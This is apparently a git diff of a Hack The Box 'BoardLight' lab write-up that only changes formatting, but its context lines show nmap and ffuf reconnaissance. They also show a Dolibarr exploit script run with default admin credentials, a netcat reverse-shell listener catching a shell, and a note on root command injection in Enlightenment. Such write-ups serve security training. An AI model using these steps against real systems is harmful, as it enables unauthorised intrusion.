@@ -53,6 +53,8 @@ nmap -sVC -p- -vv -T5 BoardLight.htb -oN BoardLight_TCP_scan
 
 > Result:
 
+```bash
+
 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
 |   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
@@ -68,6 +70,7 @@ nmap -sVC -p- -vv -T5 BoardLight.htb -oN BoardLight_TCP_scan
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
+```
 
 > I see two open ports: `80 web` and `22 ssh`. I also see that the web server is running `Apache 2.4.41`
 
@@ -125,11 +128,11 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u '
 
 > Result:
 
-![crm_subdomain](./screenshots/sub_domain.png)
+![crm_subdomain](./screenshots/crm_subdomain.png)
 
 > Ok, I found the `crm` subdomain
 
-> add this subdomain in /etc/hosts:
+> add this subdomain in `/etc/hosts`:
 
 ```bash
 
@@ -264,7 +267,7 @@ python3 doliexploit.py 'http://crm.board.htb' admin admin 10.10.14.7 4445
 
 ```bash
 
- nc -lvnp 4445
+nc -lvnp 4445
 listening on [any] 4445 ...
 connect to [10.10.14.7] from (UNKNOWN) [10.10.11.11] 56826
 www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
@@ -562,7 +565,9 @@ ae98930d57f5c9aaa794ff930dd9c5fc
 > version `0.23.1`, which is part of the `Enlightenment` environment. This vulnerability allows executing arbitrary commands with `root` privileges. > This is achieved by passing unfiltered user input to the `system()` function call, resulting in `command injection`.
 > By exploiting this vulnerability, the system was `compromised`.
 
-![solved_machine](./screenshots/solved_machine.png)
+<p align="center">
+  <img src="./screenshots/solved_machine.png" alt="solved_mschine" width="400"/>
+</p>
 
 ---
 
